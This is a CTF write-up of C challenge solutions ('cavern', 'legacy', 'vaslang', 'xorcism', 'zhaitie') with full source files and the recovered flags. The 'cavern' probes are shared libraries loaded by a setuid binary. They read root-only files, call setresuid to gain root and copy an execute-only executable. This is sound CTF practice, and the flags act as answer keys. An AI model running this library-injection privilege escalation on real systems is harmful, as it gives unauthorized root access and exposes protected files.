# Finding Cheburashka — C CTF solutions

Author: Robert Kharisov
Session: 15 November 2026

The following sections describe my completed solutions. Container commands run in the corresponding challenge directory; my implementations are included in the collapsible blocks below and should be saved under the displayed filenames before compiling. Original challenge inputs and libraries are supplied by the course and are not attached here. The zhaitie run below uses macOS Apple Silicon.

## cavern

I used the library loaded by the setuid executable to inspect its startup files. `/init` pointed to `/opt/cavern/patch_flag.py`, which patches a 55-byte table using the repeating XOR key `C1 0F FE 5A`. My final library reads `/proc/self/exe` and finds the table that decodes to `cctf{...}`. The earlier dangling-pointer read returned a different, rejected table.

Implementation files below: `probe2.c`, `probe3.c`, `probe4.c`.

```bash
gcc -shared -fPIC -o probe2.so probe2.c
./cavern ./probe2.so
gcc -shared -fPIC -o probe3.so probe3.c
./cavern ./probe3.so
gcc -shared -fPIC -o probe4.so probe4.c
./cavern ./probe4.so
```

**Result:** `cctf{R3M3MBeR_tHeRe_1s_no_SP0ON_Free_fr0m_n4s41_DeMon5}` (table offset 8480 in my executable).

## legacy

The original hash assumed an 18-bit `unsigned`. On my machine it produced out-of-range array indices. I restored modulo-2¹⁸ arithmetic after each hash step; the diagnostic check then matched `237614`. Implementation below: `legacy-fixed.c`.

```c
h = (h * 67 + (unsigned char)*s++) & 0x3FFFFu;
```

```bash
gcc -o legacy-fixed legacy-fixed.c
./legacy-fixed
```

**Result:** `cctf{the_GoOd_old_DAy5_WiTh_900d_olD_C}`.

## vaslang

The interpreter resolved function calls while parsing definitions, but `inp.vas` contains forward references. I stored each callee name during parsing and resolved it in the execution loop, after all definitions had loaded. This also permits recursive calls.

Implementation files below: `vaslang-fixed.c`, `vaslang-fix.patch`, `inp.vas` (provided with the task).

```bash
gcc -O0 -o vaslang-fixed vaslang-fixed.c
./vaslang-fixed < inp.vas 2>&1 | grep -o 'cctf{[^}]*}'
```

**Result:** `cctf{y0u_CoulD_havE_5o1vEd_7h1s_The_fUn_WAY}`; no interpreter errors in the successful run.

## xorcism

The password check compares each input byte with `enc[i] ^ key[i % 4]`. Both arrays are in `demon.c` (provided with the task), so I evaluated the same expression to recover the password and verified it with the program.

```bash
enc="67 4d 69 6e 64 44 05 6b 58 4f 0e 50 71 12 3f 4b 68 55 32 4a 68 4f 3b 7c 56 6d 05 4b 52 4c 6a 61 02"
key=(0x37 0x21 0x5a 0x0f)
i=0
for b in $enc; do
  printf "\\$(printf '%03o' $((0x$b ^ key[i%4])))"
  i=$((i+1))
done
echo
```

```bash
gcc -O0 -o demon demon.c
printf '%s\n' 'Pl3aSe_donT_F3eD_thE_nasaL_Dem0n5' | ./demon
```

**Result:** `cctf{Pl3aSe_donT_F3eD_thE_nasaL_Dem0n5}`.

## zhaitie

I wrote a driver for the provided decompression library. It initializes the library once, feeds exactly 24 bytes on the first call, then uses each return value as the next input size. A callback writes the output; return value zero ends the stream. Implementation below: `zhaitie-driver.c`.

```c
typedef struct razzhaitie_ctx razzhaitie_ctx;
typedef void (*razzhaitie_output_cb)(const void *buf, int len);
extern const char *zhaitie_version(void);
extern void zhaitie_init(void);
extern razzhaitie_ctx *razzhaitie_new(void);
extern int razzhaitie(razzhaitie_ctx *ctx, const void *in, int len,
                      razzhaitie_output_cb cb);

zhaitie_init();
razzhaitie_ctx *ctx = razzhaitie_new();

int need = razzhaitie(ctx, buf, 24, out_cb);   /* first window is exactly 24 */
size_t off = 24;
while (need != 0) {                            /* need = next window size */
    int consumed = need;
    need = razzhaitie(ctx, buf + off, consumed, out_cb);
    off += consumed;
}
```

```bash
clang -O2 -o zhaitie-driver zhaitie-driver.c libzhaitie-aarch64-macos.a -lpthread -lm
./zhaitie-driver test.zai presentation.txt
grep -o 'cctf{[^}]*}' presentation.txt
```

**Result:** `cctf{natURal_1NtElligEnCe_oVeR_ai_DOCs}`. The run consumed 145382 bytes in 564 calls and wrote 3013 bytes. For Linux, the same driver links against the matching Linux archive.


## Implementations

Save each block under its displayed filename before running the commands above. Original challenge files, libraries and binaries must be obtained from the course materials.

<details>
<summary>probe2.c</summary>

```c
// probe2.c — cavern: dump the environment, /entrypoint, /init and scan the
// executable for a second copy of the flag.
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

extern char **environ;

static void show(const char *path, int as_lines) {
    char buf[65536];
    int fd = open(path, O_RDONLY);
    ssize_t n, i;
    printf("===== %s =====\n", path);
    if (fd < 0) { printf("(cannot open)\n"); return; }
    n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n < 0) { printf("(read error)\n"); return; }
    if (as_lines)
        for (i = 0; i < n; i++) if (buf[i] == 0) buf[i] = '\n';
    buf[n] = 0;
    printf("%s\n", buf);
}

static void scan_exe(void) {
    static char buf[1 << 20];
    int fd = open("/proc/self/exe", O_RDONLY);
    ssize_t n, i;
    printf("===== scan /proc/self/exe for cctf{ =====\n");
    if (fd < 0) { printf("(cannot open)\n"); return; }
    while ((n = read(fd, buf, sizeof buf)) > 0)
        for (i = 0; i + 5 <= n; i++)
            if (!memcmp(buf + i, "cctf{", 5)) {
                printf("chunk offset %ld: ", (long)i);
                fwrite(buf + i, 1, (size_t)(n - i > 110 ? 110 : n - i), stdout);
                printf("\n");
            }
    close(fd);
    printf("===== end scan =====\n");
}

void run(void) {
    char **e;
    printf("===== environ (this process) =====\n");
    for (e = environ; *e; e++) printf("%s\n", *e);
    show("/entrypoint", 0);
    show("/init", 0);
    show("/proc/1/environ", 1);
    show("/proc/1/cmdline", 1);
    scan_exe();
    fflush(stdout);
}
```

</details>

<details>
<summary>probe3.c</summary>

```c
// probe3.c — cavern: read the root-only /opt/cavern directory, which holds
// patch_flag.py (the per-user flag injection script).
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

static void lsdir(const char *dir) {
    DIR *d = opendir(dir);
    struct dirent *e;
    printf("===== ls %s =====\n", dir);
    if (!d) { printf("(cannot open)\n"); return; }
    while ((e = readdir(d))) {
        char p[4096]; struct stat st;
        if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;
        snprintf(p, sizeof p, "%s/%s", dir, e->d_name);
        if (stat(p, &st) == 0)
            printf("  %s  mode=%o size=%ld\n", e->d_name, (unsigned)st.st_mode, (long)st.st_size);
        else
            printf("  %s\n", e->d_name);
    }
    closedir(d);
}

static void cat(const char *path) {
    char buf[8192];
    int fd = open(path, O_RDONLY);
    ssize_t n;
    printf("===== cat %s =====\n", path);
    if (fd < 0) { printf("(cannot open)\n"); return; }
    while ((n = read(fd, buf, sizeof buf)) > 0) fwrite(buf, 1, n, stdout);
    close(fd);
    printf("\n===== end %s =====\n", path);
}

void run(void) {
    lsdir("/opt");
    lsdir("/opt/cavern");
    cat("/opt/cavern/patch_flag.py");
    cat("/opt/cavern/flag");
    cat("/opt/cavern/flag.txt");
    cat("/opt/cavern/.flag");
    fflush(stdout);
}
```

</details>

<details>
<summary>probe4.c</summary>

```c
// probe4.c — cavern: as root, copy /proc/self/exe (the execute-only binary) to
// a readable file, then find the flag table patched by patch_flag.py.
//
// The use-after-free in `guess` returns the *decoy* table; the real per-user
// flag is the single 55-byte window that decodes under FKEY = C1 0F FE 5A to a
// string starting with "cctf{".
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

static void copy_exe(const char *dst) {
    char b[65536];
    int in = open("/proc/self/exe", O_RDONLY), out;
    ssize_t n;
    if (in < 0) { printf("open exe failed\n"); return; }
    out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out < 0) { printf("create %s failed\n", dst); close(in); return; }
    while ((n = read(in, b, sizeof b)) > 0) write(out, b, n);
    close(in); close(out);
    chmod(dst, 0644);
    printf("copied /proc/self/exe -> %s\n", dst);
}

void run(void) {
    static unsigned char buf[1 << 22];
    static const unsigned char keys[2][4] = {
        {0xC1, 0x0F, 0xFE, 0x5A},   /* FKEY (patch_flag.py) */
        {0xDE, 0xAD, 0xBE, 0xEF}    /* key from the given cavern.c */
    };
    const char *kn[2] = {"FKEY", "src-key"};
    ssize_t n, size = 0;
    int fd, k, j;

    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    printf("uid=%d euid=%d\n", getuid(), geteuid());
    copy_exe("/tmp/cavern.bin");

    fd = open("/proc/self/exe", O_RDONLY);
    if (fd < 0) { printf("open exe failed\n"); return; }
    while ((n = read(fd, buf + size, sizeof(buf) - size)) > 0) size += n;
    close(fd);
    printf("exe size = %ld\n", (long)size);

    for (k = 0; k < 2; k++) {
        ssize_t i;
        for (i = 0; i + 55 <= size; i++) {
            if ((buf[i] ^ keys[k][0]) != 'c') continue;
            if ((buf[i+1] ^ keys[k][1]) != 'c') continue;
            if ((buf[i+2] ^ keys[k][2]) != 't') continue;
            if ((buf[i+3] ^ keys[k][3]) != 'f') continue;
            if ((buf[i+4] ^ keys[k][0]) != '{') continue;
            printf("[%s] offset %ld: ", kn[k], (long)i);
            for (j = 0; j < 55; j++) {
                unsigned char c = buf[i + j] ^ keys[k][j & 3];
                putchar((c >= 32 && c < 127) ? c : '?');
            }
            printf("\n");
        }
    }
    fflush(stdout);
}
```

</details>

<details>
<summary>legacy-fixed.c</summary>

```c
// legacy-fixed.c - the provided legacy.c with the single portability fix.
//
// The original developer's machine had an 18-bit unsigned, so every
// multiplication in position() wrapped modulo 2^18 = 262144. On a modern
// 32-bit or 64-bit unsigned the same expression does not wrap at that width,
// the hashes become huge, and add_data() writes far outside document[69],
// which makes the program segfault.
//
// Emulating the old width reproduces the original behaviour exactly; the
// diagnostics below then print the same check value, 237614, as the developer's
// machine.
#include <limits.h>
#include <stdio.h>


unsigned position(const char *s)
{
    unsigned h = 0;
    while (*s) {
        h = (h * 67 + (unsigned char)*s++) & 0x3FFFFu;   /* 18-bit unsigned */
    }
    return h;
}

void diagnostics(void)
{
    printf("== Diagnostics: ==\n");
    printf(" unsigned has %d bits\n", (int)(sizeof(unsigned) * CHAR_BIT));
    printf(" check value: %u\n", position("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"));
    printf("== End of Diagnostics ==\n\n");
}

void add_data(char* document, const char* data)
{
    unsigned pos = position(data);
    document[pos] = *data;
}

void decrypt_document(void)
{
    char document[69] = {0};

    add_data(document, "52Vor");
    add_data(document, "o0KiO");
    add_data(document, "_0GVq");
    add_data(document, "h0QBj");
    add_data(document, "l1foc");
    add_data(document, "_0GVh");
    add_data(document, "_0GVv");
    add_data(document, "e0tqV");
    add_data(document, "O0CDP");
    add_data(document, "T0i9T");
    add_data(document, "o2tuq");
    add_data(document, "C2KyY");
    add_data(document, "00BEw");
    add_data(document, "l0oTk");
    add_data(document, "_1yII");
    add_data(document, "i0Xhz");
    add_data(document, "_0GVl");
    add_data(document, "D0djH");
    add_data(document, "d02tH");
    add_data(document, "_0GW8");
    add_data(document, "00BEx");
    add_data(document, "A1EUf");
    add_data(document, "91CLd");
    add_data(document, "W0EMg");
    add_data(document, "y1TRq");
    add_data(document, "h2zOp");
    add_data(document, "_0GVc");
    add_data(document, "G18Uk");
    add_data(document, "d02t9");
    add_data(document, "t07CD");
    add_data(document, "o0Ki8");
    add_data(document, "D0diz");
    add_data(document, "d02sx");

    printf("== Decrypted Document: ==\n");
    printf("cctf{%s}\n", document);
    printf("== End of Decrypted Document ==\n\n");
}

int main()
{
    diagnostics();

    printf("Attempting to decrypt the document...\n");

    decrypt_document();

    return 0;
}
```

</details>

<details>
<summary>vaslang-fixed.c</summary>

```c
// vaslang.c with the call-resolution bug fixed:
// calls are resolved by NAME at run time, so forward references and recursion
// work (the original xdef resolved calls while parsing and aborted on any
// function defined later in the file).
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define errorf(fmt, ...) {\
    printf("ERROR: " fmt "\n", ##__VA_ARGS__);\
    return;}

struct term {
    char ty;
    char *name;                 /* callee name for 'C' terms */
    union {
        struct term *target;
        unsigned char val;
    };
};
struct func {
    char *name;
    struct term *body;
};

struct term terms[1048576] = {0};
struct func funcs[65536] = {0};
struct term *termp = terms;
struct func *funcp = funcs;

struct term *fs[512] = {0};
unsigned char vs[512] = {0};
struct term **fsp = fs;
unsigned char *vsp = vs;

static struct term *lookup(const char *name)
{
    for (int i = 0; funcs + i < funcp; i++)
        if (strcmp(funcs[i].name, name) == 0)
            return funcs[i].body;
    return NULL;
}

void run(struct term *t)
{
    unsigned l, r;
    fsp = fs;
    vsp = vs;

    while (1) {
        switch (t->ty) {
        case '+':
            l = *--vsp;
            r = *--vsp;
            *vsp++ = (l + r) % 251;
            break;
        case '*':
            l = *--vsp;
            r = *--vsp;
            *vsp++ = (l * r) % 251;
            break;
        case ':':
            l = *--vsp;
            *vsp++ = l;
            *vsp++ = l;
            break;
        case '.':
            vsp--;
            break;
        case 'P':
            *vsp++ = t->val;
            break;
        case 'C': {
            struct term *body = lookup(t->name);
            if (body == NULL) {
                printf("ERROR: func %s undefined\n", t->name);
                return;
            }
            *fsp++ = t;
            t = body - 1;
            break;
        }
        case 'R':
            if (fsp == fs) {
                for (vsp = vs; *vsp; putchar(*vsp++));
                putchar('\n');
                return;
            }

            t = *--fsp;
            break;
        }
        t++;
    }
}

void xcmd(char* s)
{
    char *name = strsep(&s, "!");
    for (int i = 0; funcs + i < funcp; i++)
        if (strcmp(funcs[i].name, name) == 0)
            return run(funcs[i].body);
    errorf("func %s undefined", name);
}

void xdef(const char* sp)
{
    char *s = strdup(sp);
    char *name = strsep(&s, ":");

    struct func *func = funcp;

    for (int i = 0; funcs + i < funcp; i++)
        if (strcmp(funcs[i].name, name) == 0)
            func = funcs + i;

    struct term *ftermp = termp;
    func->name = name;
    func->body = ftermp;

    while (s != NULL)
    {
        char* term = strsep(&s, " ");
        if (*term == 0)
            continue;

        unsigned char val;
        char* endp;

        if (term[0] == '+' || term[0] == '*' ||
            term[0] == ':' || term[0] == '.') {
            ftermp->ty = term[0];
        } else if (val = strtol(term, &endp,
                10), endp != term) {
            ftermp->ty = 'P';
            ftermp->val = val;
        } else {
            ftermp->ty = 'C';
            ftermp->name = term;   /* resolved at run time */
        }
        ftermp++;
    }
    ftermp->ty = 'R';
    ftermp++;

    funcp++;
    termp = ftermp;
}

void xline(char *s)
{
    if (strchr(s, '!') != NULL)
        xcmd(s);
    else if (strchr(s, ':') != NULL)
        xdef(s);
    else
        errorf("Failed to parse %s: [command!] or"
               " [definition: body] expected", s)
}

void xrom(const char *s)
{
    char buf[640 * 1024];
    strcpy(buf, s);
    xline(buf);
}

int main()
{
    char buf[640 * 1024];
    xrom("hello: 104 : 248 + : 180 * : 111 0");
    xrom("hello!");
    while (1) {
        printf("> ");
        if (fgets(buf, sizeof(buf), stdin) == NULL)
            return 0;
        *strchrnul(buf, '\n') = 0;
        xline(buf);
    }
}
```

</details>

<details>
<summary>vaslang-fix.patch</summary>

```diff
--- vaslang.c	2026-11-15 17:59:09
+++ vaslang-fixed.c	2026-11-15 17:58:22
@@ -1,3 +1,7 @@
+// vaslang.c with the call-resolution bug fixed:
+// calls are resolved by NAME at run time, so forward references and recursion
+// work (the original xdef resolved calls while parsing and aborted on any
+// function defined later in the file).
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -8,6 +12,7 @@

 struct term {
     char ty;
+    char *name;                 /* callee name for 'C' terms */
     union {
         struct term *target;
         unsigned char val;
@@ -28,6 +33,14 @@
 struct term **fsp = fs;
 unsigned char *vsp = vs;

+static struct term *lookup(const char *name)
+{
+    for (int i = 0; funcs + i < funcp; i++)
+        if (strcmp(funcs[i].name, name) == 0)
+            return funcs[i].body;
+    return NULL;
+}
+
 void run(struct term *t)
 {
     unsigned l, r;
@@ -57,10 +70,16 @@
         case 'P':
             *vsp++ = t->val;
             break;
-        case 'C':
+        case 'C': {
+            struct term *body = lookup(t->name);
+            if (body == NULL) {
+                printf("ERROR: func %s undefined\n", t->name);
+                return;
+            }
             *fsp++ = t;
-            t = t->target-1;
+            t = body - 1;
             break;
+        }
         case 'R':
             if (fsp == fs) {
                 for (vsp = vs; *vsp; putchar(*vsp++));
@@ -117,11 +136,7 @@
             ftermp->val = val;
         } else {
             ftermp->ty = 'C';
-            for (int i = 0; funcs + i < funcp; i++)
-                if (strcmp(funcs[i].name, term) == 0)
-                    ftermp->target = funcs[i].body;
-            if (ftermp->target == NULL)
-                errorf("func %s undefined", term);
+            ftermp->name = term;   /* resolved at run time */
         }
         ftermp++;
     }
```

</details>

<details>
<summary>zhaitie-driver.c</summary>

```c
/* zhaitie decompressor driver, following zhaitie-AGENTS.md exactly. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct razzhaitie_ctx razzhaitie_ctx;
typedef void (*razzhaitie_output_cb)(const void *buf, int len);

extern const char *zhaitie_version(void);
extern void zhaitie_init(void);
extern razzhaitie_ctx *razzhaitie_new(void);
extern int razzhaitie(razzhaitie_ctx *ctx, const void *in, int len,
                      razzhaitie_output_cb cb);

static FILE *g_out;
static unsigned long g_total;

static void out_cb(const void *buf, int len)
{
    if (len > 0) {
        fwrite(buf, 1, (size_t)len, g_out);
        g_total += (unsigned long)len;
    }
}

int main(int argc, char **argv)
{
    const char *inpath, *outpath;
    FILE *f;
    long sz;
    unsigned char *buf;
    razzhaitie_ctx *ctx;
    size_t off;
    int need, calls;

    if (argc < 3) {
        fprintf(stderr, "usage: %s <in.zai> <out>\n", argv[0]);
        return 2;
    }
    inpath = argv[1];
    outpath = argv[2];

    f = fopen(inpath, "rb");
    if (!f) { perror("open in"); return 1; }
    fseek(f, 0, SEEK_END);
    sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    buf = malloc((size_t)sz);
    if (!buf) { fprintf(stderr, "oom\n"); return 1; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) { perror("read"); return 1; }
    fclose(f);

    g_out = fopen(outpath, "wb");
    if (!g_out) { perror("open out"); return 1; }

    printf("zhaitie version: %s\n", zhaitie_version());

    zhaitie_init();
    ctx = razzhaitie_new();

    /* Step 3: first window is exactly 24 bytes. */
    if (sz < 24) { fprintf(stderr, "file too small\n"); return 1; }
    need = razzhaitie(ctx, buf, 24, out_cb);
    off = 24;
    calls = 1;

    /* Step 4: nonzero return = exact size of the next window. */
    while (need != 0) {
        if (off + (size_t)need > (size_t)sz) {
            fprintf(stderr, "truncated: need %d at offset %zu of %ld\n",
                    need, off, sz);
            break;
        }
        {
            int consumed = need;
            need = razzhaitie(ctx, buf + off, consumed, out_cb);
            off += (size_t)consumed;
        }
        calls++;
    }

    fclose(g_out);
    printf("done: %d calls, %zu bytes consumed, %lu bytes written\n",
           calls, off, g_total);
    free(buf);
    return 0;
}
```

</details>
